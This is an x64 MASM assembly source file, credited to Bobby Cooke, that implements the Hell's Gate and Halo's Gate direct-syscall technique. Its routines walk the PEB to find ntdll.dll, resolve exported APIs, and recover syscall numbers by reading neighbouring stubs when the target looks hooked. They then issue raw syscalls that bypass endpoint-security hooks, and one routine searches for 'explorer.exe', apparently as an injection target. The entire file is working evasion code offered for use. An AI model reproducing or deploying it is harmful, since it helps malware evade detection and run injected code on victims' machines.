; Author: Bobby Cooke @0xBoku | https://github.com/boku7 | https://0xBoku.com | https://www.linkedin.com/in/bobby-cooke/
; Credits / References: Pavel Yosifovich (@zodiacon),Reenz0h from @SEKTOR7net, @smelly__vx & @am0nsec ( Creators/Publishers of the Hells Gate technique)

.code 

getntdll PROC
	xor rdi, rdi            ; RDI = 0x0
	mul rdi                 ; RAX&RDX =0x0
	mov rbx, gs:[rax+60h]   ; RBX = Address_of_PEB
	mov rbx, [rbx+18h]      ; RBX = Address_of_LDR
	mov rbx, [rbx+20h]      ; 
	mov rbx, [rbx]          ; RBX = 1st entry in InitOrderModuleList / ntdll.dll
	mov rbx, [rbx+20h]      ; RBX = &ntdll.dll ( Base Address of ntdll.dll)
	mov rax, rbx            ; RBX & RAX = &ntdll.dll
	ret                     ; return to caller
getntdll ENDP

; Get ExportTable Address of supplied module DLL
getExportTable PROC
	mov rbx, rcx            ; RBX = Supplied Module Address
	mov r8, rcx             ; R8  = Supplied Module Address
	mov ebx, [rbx+3Ch]      ; RBX = Offset NewEXEHeader
	add rbx, r8             ; RBX = &ntdll.dll + Offset NewEXEHeader = &NewEXEHeader
	xor rcx, rcx            ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
	add cx, 88ffh
	shr rcx, 8h             ; RCX = 0x88ff --> 0x88
	mov edx, [rbx+rcx]      ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
	add rdx, r8             ; RDX = &ntdll.dll + RVA ExportTable = &ExportTable
	mov rax, rdx            ; RAX = &module.ExportTable
	ret                     ; return to caller
getExportTable ENDP

; Get &module.ExportTable.AddressTable from &module.ExportTable
getExAddressTable PROC
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r10, r10
	mov r10d, [rdx+1Ch]     ; RDI = RVA AddressTable
	add r10, r8             ; R10 = &AddressTable
	mov rax, r10            ; RAX = &module.ExportTable.AddressTable
	ret                     ; return to caller
getExAddressTable ENDP

; Get &module.NamePointerTable from &module.ExportTable
getExNamePointerTable PROC
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r11, r11
	mov r11d, [rdx+20h]     ; R11 = [&ExportTable + Offset RVA Name PointerTable] = RVA NamePointerTable
	add r11, r8             ; R11 = &NamePointerTable (Memory Address of module Export NamePointerTable)
	mov rax, r11            ; RAX = &module.ExportTable.NamePointerTable
	ret                     ; return to caller
getExNamePointerTable ENDP

; Get &OrdinalTable from ntdll.dll ExportTable
getExOrdinalTable PROC
	mov r8, rdx             ; R8  = &module.dll
	mov rdx, rcx            ; RDX = &module.ExportTable
	xor r12, r12
	mov r12d, [rdx+24h]     ; R12 = RVA  OrdinalTable
	add r12, r8             ; R12 = &OrdinalTable
	mov rax, r12            ; RAX = &module.ExportTable.OrdinalTable
	ret                     ; return to caller
getExOrdinalTable ENDP

; Get the address of the API from the module ExportTable
; IN: &Module.ExportTable.NamePointerTable + &Module
getApiAddr PROC
	mov r10, r9             ; R10 = &module.ExportTable.AddressTable
	mov r11, [rsp+28h]      ; R11 = &module.ExportTable.NamePointerTable
	mov r12, [rsp+30h]      ; R12 = &module.ExportTable.OrdinalTable
	xor rax, rax            ; Setup Counter for resolving the API Address after finding the name string
	push rcx                ; push the string length counter to stack
	jmp short getApiAddrLoop
getApiAddr ENDP

getApiAddrLoop PROC
	mov rcx, [rsp]          ; reset the string length counter from the stack
	xor rdi, rdi            ; Clear RDI for setting up string name retrieval
	mov edi, [r11+rax*4]    ; EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
	add rdi, r8             ; RDI = &NameString    = RVA NameString + &module.dll
	mov rsi, rdx            ; RSI = Address of API Name String to match on the Stack  (reset to start of string)
	repe cmpsb              ; Compare strings at RDI & RSI
	je getApiAddrFin        ; If match then we found the API string. Now we need to find the Address of the API
	inc rax
	jmp short getApiAddrLoop
getApiAddrLoop ENDP

; Find the address of GetProcAddress by using the last value of the Counter
getApiAddrFin PROC
	pop rcx                 ; remove string length counter from top of stack
	mov ax, [r12+rax*2]     ; RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
	mov eax, [r10+rax*4]    ; RAX = RVA API = [&AddressTable + API OrdinalNumber]
	add rax, r8             ; RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
	ret                     ; return to API caller
getApiAddrFin ENDP

; Find the syscall number for the NTDLL API with provided API address
; RCX = NTDLL.<API> Address
findSyscallNumber PROC
	xor rsi, rsi
	xor rdi, rdi 
	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub (mov r10,rcx;mov eax,<syscall#>)
	cmp rsi, rdi
	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
	xor rax,rax            ; clear RAX as it will hold the syscall
	mov ax, [rcx+4]        ; The systemcall number
	ret                    ; return to caller
findSyscallNumber ENDP

; RCX = &NTDLL.<API> | RDX = 32bytes * Up Increment 
halosGateUp PROC
	xor rsi, rsi
	xor rdi, rdi 
	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
	xor rax, rax
	mov al, 20h            ; 32 * Increment = Syscall Up
	mul dx                 ; RAX = RAX * RDX = 32 * Syscall Up
	add rcx, rax           ; RCX = NTDLL.API +- Syscall Stub
	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Up by HalosGate (mov r10, rcx; mov eax, <syscall#>)
	cmp rsi, rdi
	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
	xor rax,rax            ; clear RAX as it will hold the syscall
	mov ax, [rcx+4]        ; The systemcall number for the API close to the target
	ret                    ; return to caller
halosGateUp ENDP

; RCX = &NTDLL.<API> | RDX = 32bytes * Down Increment 
halosGateDown PROC
	xor rsi, rsi
	xor rdi, rdi 
	mov rsi, 00B8D18B4Ch   ; bytes at start of NTDLL stub to setup syscall in RAX
	xor rax, rax
	mov al, 20h            ; 32 * Increment = Syscall Down
	mul dx                 ; RAX = RAX * RDX = 32 * Syscall Down
	sub rcx, rax           ; RCX = NTDLL.API - Syscall Stub
	mov edi, [rcx]         ; RDI = first 4 bytes of NTDLL API syscall stub, incremented Down by HalosGate (mov r10, rcx; mov eax, <syscall#>)
	cmp rsi, rdi
	jne error              ; if the bytes dont match then its prob hooked. Exit gracefully
	xor rax,rax            ; clear RAX as it will hold the syscall
	mov ax, [rcx+4]        ; The systemcall number for the API close to the target
	ret                    ; return to caller
halosGateDown ENDP

error PROC
	xor rax, rax ; return 0 for error
	ret          ; return to caller
error ENDP

HellsGate PROC
	xor r11, r11
	mov r11d, ecx
	ret
HellsGate ENDP

HellDescent PROC
	xor rax, rax
	mov r10, rcx
	mov eax, r11d
	syscall
	ret
HellDescent ENDP

compExplorer PROC
	xor rsi, rsi
	cmp rsi, rcx
	je error                   ; This is a null entry, skip this one
	mov rsi, 6c007000780065h   ; unicode "expl"
	mov rdx, [rcx]             ; move the first 4 characters of the string into RCX register
	cmp rsi, rdx
	jne error                  ; if the bytes dont its match not "expl", try the next one
	mov rsi, 7200650072006fh   ;  6f 00 72 00 65 00 72 00  o.r.e.r.
	mov rdx, [rcx+8h]          ; move the next 4 characters of the string into RCX register "orer"
	cmp rsi, rdx
	jne error                  ; if the bytes dont match its not "explorer", try the next one
	mov rsi, 6500780065002eh   ; 2e 00 65 00 78 00 65 00  ..e.x.e.
	mov rdx, [rcx+10h]         ; move the next 4 characters of the string into RCX register ".exe"
	cmp rsi, rdx
	jne error                  ; if the bytes dont match its not "explorer.exe", try the next one
	mov rax, 1h                ; found "explorer.exe" return true
	ret
compExplorer ENDP

end
